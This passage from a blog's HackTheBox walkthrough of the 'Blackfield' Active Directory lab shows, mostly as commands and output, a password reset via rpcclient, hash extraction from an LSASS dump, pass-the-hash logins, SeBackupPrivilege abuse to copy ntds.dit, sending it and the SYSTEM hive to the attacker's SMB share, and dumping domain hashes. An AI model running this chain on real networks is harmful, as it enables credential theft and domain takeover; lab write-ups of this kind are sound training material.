</pre></table></code></div></div><p>Then <code class="language-plaintext highlighter-rouge">zip</code> all the <code class="language-plaintext highlighter-rouge">json</code> files and drag them into <code class="language-plaintext highlighter-rouge">BloodHound</code> after that start <code class="language-plaintext highlighter-rouge">neo4j</code> and <code class="language-plaintext highlighter-rouge">bloodhound</code> then load the <code class="language-plaintext highlighter-rouge">zip</code> file into <code class="language-plaintext highlighter-rouge">bloodhound</code></p><p>Search all the three users obtained before and mark user <code class="language-plaintext highlighter-rouge">support</code> as <code class="language-plaintext highlighter-rouge">owned</code> and remaining two as <code class="language-plaintext highlighter-rouge">user with high value</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/blackfield/01.png" alt="image" /></p><p>After done marking them then select <code class="language-plaintext highlighter-rouge">shortest Paths to Here from Owned</code> user <code class="language-plaintext highlighter-rouge">svc_backup</code> has nothing but user <code class="language-plaintext highlighter-rouge">audit2020</code> has the following</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/blackfield/02.png" alt="image" /></p><p>This means that The user <code class="language-plaintext highlighter-rouge">SUPPORT</code> has the capability to change the user <code class="language-plaintext highlighter-rouge">AUDIT2020</code>’s password without knowing that user’s current password.</p><p>To change the password use the <code class="language-plaintext highlighter-rouge">rpcclient</code> it is well explained in <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">malicious.link</a></p><ol><li>Authenticate to <code class="language-plaintext highlighter-rouge">rpcclient</code> as user <code class="language-plaintext highlighter-rouge">support</code><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ rpcclient -U "support" 10.10.10.192  
Password for [WORKGROUP\support]:
rpcclient $&gt; 
</pre></table></code></div></div></li><li>Change the password for user <code class="language-plaintext highlighter-rouge">Audit2020</code><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rpcclient $&gt; setuserinfo2 Audit2020 23 '@Gemstone'
</pre></table></code></div></div><h3 id="access-to-forensic-file">Access to Forensic file</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ crackmapexec smb 10.10.10.192 -u Audit2020 -p '@Gemstone' --shares
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Audit2020:@Gemstone 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
</pre></table></code></div></div><p>Now we can read the Forensic file</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ sudo mount -t cifs -o 'username=audit2020,password=@Gemstone' //10.10.10.192/forensic /mnt
</pre></table></code></div></div><p>The mount way helps to dump everything into attackers machine.</p></li></ol><p>After analyzing the files from the forensic share then found <code class="language-plaintext highlighter-rouge">.zip</code> file named as <code class="language-plaintext highlighter-rouge">lsass.zip</code> it stands for Local Security Authority Subsystem Service and it is a system process in the Windows operating system that is responsible for enforcing the security policy on the system. Copy the <code class="language-plaintext highlighter-rouge">lsass.zip</code> into your machine</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/forensic]
└─$ sudo cp -v /mnt/memory_analysis/lsass.zip .
</pre></table></code></div></div><p>This file has <code class="language-plaintext highlighter-rouge">40M</code> so after it finishes unzip it to have a <code class="language-plaintext highlighter-rouge">lsass.DMP</code> to crack this the tool known as <code class="language-plaintext highlighter-rouge">pypykatz</code> will be used</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/forensic]
└─$ pypykatz lsa minidump lsass.DMP &gt; lsass.plain
</pre></table></code></div></div><p>This will provide some potential data including the <code class="language-plaintext highlighter-rouge">NT</code> for user <code class="language-plaintext highlighter-rouge">Administrator</code> and <code class="language-plaintext highlighter-rouge">svc_backup</code> <code class="language-plaintext highlighter-rouge">svc_backup : 9658d1d1dcd9250115e2205d9f48400d</code> and <code class="language-plaintext highlighter-rouge">Administrator : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62</code></p><h2 id="user-account">User Account</h2><p>Check with <code class="language-plaintext highlighter-rouge">crackmapexec</code> to see if you can <code class="language-plaintext highlighter-rouge">pwn</code> the machine with <code class="language-plaintext highlighter-rouge">winrm</code> service</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/forensic]
└─$ crackmapexec winrm 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
</pre></table></code></div></div><p>Then we can login by using <code class="language-plaintext highlighter-rouge">evil-winrm</code> as user <code class="language-plaintext highlighter-rouge">svc_backup</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d 
</pre></table></code></div></div><p><strong>User flag</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc_backup\desktop&gt; type user.txt
3920bb317a0bef*********** 
</pre></table></code></div></div><h2 id="administrator-account">Administrator Account</h2><p>In <code class="language-plaintext highlighter-rouge">C:\</code> there is a note called <code class="language-plaintext highlighter-rouge">note.txt</code> which has the following information</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\&gt; cat notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup &amp; restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
</pre></table></code></div></div><p>It seems some of the things have not being implemented including disable <code class="language-plaintext highlighter-rouge">auditor's account</code></p><p>View user <code class="language-plaintext highlighter-rouge">svc_backup</code> privilege</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami /priv
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</pre></table></code></div></div><p>We can abuse the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> you can read in details <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">hackingarticles</a> but in short <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> was designed for allowing users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system. This privilege must bypass any ACL that the Administrator has placed in the network. So, in a nutshell, this privilege allows the user to read any file on the entirety of the files that might also include some sensitive files such as the SAM file or SYSTEM Registry file.</p><h3 id="exploit-sebackupprivilege">Exploit SeBackupPrivilege</h3><p>Again from <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">hackingarticles</a> to exploit this we need the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file to extract the hashes along with the system hive. The problem with the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file is that while the Target Machine is running the file always remains in the usage and as we are pretty aware of the fact that when a file is an underuse then it is not possible to copy the file using any conventional methods. To circumvent this problem, we need to use <code class="language-plaintext highlighter-rouge">diskshadow</code> functionality. This is a built-in function of Windows that can help us create a copy of a drive that is currently in use.</p><p>Here are steps to follow</p><ol><li>Create a directory that will have both rad and write permission<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\&gt; mkdir Temp 
</pre></table></code></div></div></li><li>In your Linux machine create a file that will instruct the <code class="language-plaintext highlighter-rouge">diskshadow </code>to create a copy of the <code class="language-plaintext highlighter-rouge">C: Drive</code> into a <code class="language-plaintext highlighter-rouge">Z</code> Drive with <code class="language-plaintext highlighter-rouge">pwn</code>as its alias but alias can be anything of your choice. <strong>Command</strong><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/exploit]
└─$ vim pwn.dsh
</pre></table></code></div></div><p><strong>Contents</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
</pre></table></code></div></div><p><strong>Convert</strong> After creating this <code class="language-plaintext highlighter-rouge">dsh</code> file, use the <code class="language-plaintext highlighter-rouge">unix2dos</code> to convert the encoding and spacing of the <code class="language-plaintext highlighter-rouge">dsh</code> file to the one that is compatible with the Windows Machine</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/exploit]
└─$ unix2dos pwn.dsh 
</pre></table></code></div></div></li><li>Send the <code class="language-plaintext highlighter-rouge">dsh</code> file into Windows machine<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/exploit]
└─$ python3 -m http.server 80
</pre></table></code></div></div><p><strong>Receive</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt; iwr http://10.10.14.5/pwn.dsh -outf pwn.dsh 
</pre></table></code></div></div></li><li>Use <code class="language-plaintext highlighter-rouge">diskshadow</code> to create a copy of the <code class="language-plaintext highlighter-rouge">C drive</code> into <code class="language-plaintext highlighter-rouge">Z drive</code>.<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt; diskshadow /s pwn.dsh 
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre> Microsoft DiskShadow version 1.0
 Copyright (C) 2013 Microsoft Corporation
 On computer:  DC01,  12/23/2022 7:27:40 AM

 -&gt; set context persistent nowriters
 -&gt; add volume c: alias pwn                                
 -&gt; create                                                 
 Alias pwn for shadow ID {cd905d2b-2506-4e1d-8306-1b8cc54c6140} set as environment variable.                          
 Alias VSS_SHADOW_SET for shadow set ID {f754b504-5058-4c68-aeaf-36cd279ba191} set as environment variable.           

 Querying all shadow copies with the shadow copy set ID {f754b504-5058-4c68-aeaf-36cd279ba191}                        

         * Shadow copy ID = {cd905d2b-2506-4e1d-8306-1b8cc54c6140}               %pwn%                                
                 - Shadow copy set: {f754b504-5058-4c68-aeaf-36cd279ba191}       %VSS_SHADOW_SET%                     
                 - Original count of shadow copies = 1
                 - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]                      
                 - Creation time: 12/23/2022 7:27:42 AM
                 - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1                           
                 - Originating machine: DC01.BLACKFIELD.local                                                         
                 - Service machine: DC01.BLACKFIELD.local
                 - Not exposed
                 - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}                                                
                 - Attributes:  No_Auto_Release Persistent No_Writers Differential                                    

 Number of shadow copies listed: 1
 -&gt; expose %pwn% z:                                        
 -&gt; %pwn% = {cd905d2b-2506-4e1d-8306-1b8cc54c6140}
 The shadow copy was successfully exposed as z:\.
 -&gt; 
</pre></table></code></div></div></li><li>Use the <code class="language-plaintext highlighter-rouge">RoboCopy</code> tool to copy the file from the Z Drive to the Temp Directory.<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt; robocopy /b z:\windows\ntds . ntds.dit  
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre> -------------------------------------------------------------------------------                                      
 ROBOCOPY     ::     Robust File Copy for Windows
 -------------------------------------------------------------------------------                                      

 Started : Friday, December 23, 2022 7:31:52 AM
 Source : z:\windows\ntds\                              
     Dest : C:\Temp\                                      

     Files : ntds.dit                                      

 Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

 ------------------------------------------------------------------------------                                       

                         1    z:\windows\ntds\
             New File              18.0 m        ntds.dit
</pre></table></code></div></div></li><li>Send <code class="language-plaintext highlighter-rouge">ntds</code> from Windows machine to Linux machine. In Linux machine create a share name mine is <code class="language-plaintext highlighter-rouge">sec</code> and path mine is <code class="language-plaintext highlighter-rouge">.</code> for more explanation check at <a href="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html">0xdf</a><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/exploit]
└─$ impacket-smbserver sec . -smb2support -u  gems -password gems
</pre></table></code></div></div><p>In Windows machine</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt;  net use \\10.10.14.5\sec /u:gems gems                                                     
*Evil-WinRM* PS C:\Temp&gt; copy ntds.dit \\10.10.14.5\sec 
</pre></table></code></div></div></li><li>We are now in the possession of the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file and we need to extract the system hive. This can be done with a simple reg save command as shown below<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt; reg save hklm\system c:\Temp\system                                                         
The operation completed successfully.
</pre></table></code></div></div><p><strong>Send to Linux machine</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> *Evil-WinRM* PS C:\Temp&gt; copy system  \\10.10.14.5\sec
</pre></table></code></div></div><p>Alternatively you can use <code class="language-plaintext highlighter-rouge">upload</code> and <code class="language-plaintext highlighter-rouge">download</code> command to transfer files.</p><ol><li>On our Kali Linux shell, we can use the <code class="language-plaintext highlighter-rouge">secretsdump</code> script that is a part of the <code class="language-plaintext highlighter-rouge">Impacket</code> Framework to extract our hashes from the <code class="language-plaintext highlighter-rouge">ntds.dit</code>file and the system hive</li></ol><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/exploit]
 └─$ impacket-secretsdump -ntds ntds.dit -system system local  
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre> Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                                                                                                                                                   

 [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393                                                                                                                                                                              
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                              
 [*] Searching for pekList, be patient                                                                                                                                                                                                      
 [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                                                                                                                                                          
 [*] Reading and decrypting hashes from ntds.dit                                                                                                                                                                                            
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                                                                                                                                                     
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                      
 DC01$:1000:aad3b435b51404eeaad3b435b51404ee:3774928fe55833e6c62abdc233f47a7b:::                                     
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::                                     
 audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::                                 
 support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::                                   
 BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::         
 [...]
</pre></table></code></div></div><p>We can use Pass-The-Hash again with the admin’s hash, get a shell and read the <code class="language-plaintext highlighter-rouge">root.txt flag</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee 
</pre></table></code></div></div><p><strong>Root flag</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Evil-WinRM* PS C:\Users\Administrator\desktop&gt; type root.txt
4375a629c7c67c*******************
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> Mungu Nisaidie
</pre></table></code></div></div></li></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/htb-windows/'>HTB-Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/machines/" class="post-tag no-text-decoration" >Machines</a> <a href="/tags/ad/" class="post-tag no-text-decoration" >AD</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1"></span> <span class="share-icons"> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/machines/">Machines</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/forest/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 18, 2022 <i class="unloaded">2022-12-18T18:49:38+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Forest</h3><div class="text-muted small"><p> Enumeration Nmap Scanning. Command └─$ nmap -sC -sV 10.10.10.161 -oN nmap-scan2 Result. # Nmap 7.93 scan initiated Tue Dec 13 08:41:32 2022 as: nmap -sC -sV -oN nmap-scan2 10.10.10.161 Nmap scan r...</p></div></div></a></div><div class="card"> <a href="/active/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 19, 2022 <i class="unloaded">2022-12-19T18:49:38+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active</h3><div class="text-muted small"><p> Enumeration Nmap Scanning Command └─$ nmap -sC -sV 10.10.10.100 -oN nmap-scan Result # Nmap 7.93 scan initiated Mon Dec 19 18:37:32 2022 as: nmap -sC -sV -oN nmap-scan 10.10.10.100 Nmap scan repor...</p></div></div></a></div><div class="card"> <a href="/sauna/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 20, 2022 <i class="unloaded">2022-12-20T13:49:38+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sauna</h3><div class="text-muted small"><p> Enumeration Nmap Scanning Command └─$ nmap -sC -sV 10.10.10.175 -oN nmap-scan Result # Nmap 7.93 scan initiated Mon Dec 19 14:22:37 2022 as: nmap -sC -sV -oN nmap-scan 10.10.10.175 Nmap scan repo...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/sauna/" class="btn btn-outline-primary"><p>Sauna</p></a> <a href="/resolute/" class="btn btn-outline-primary"><p>Resolute</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/hashghost21">Julius Soraely</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <script src="https://www.hackthebox.com/badge/990235"></script></p></div><div class="footer-right"><p class="mb-0"><h4>H4cking is Fun</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/machines/">Machines</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
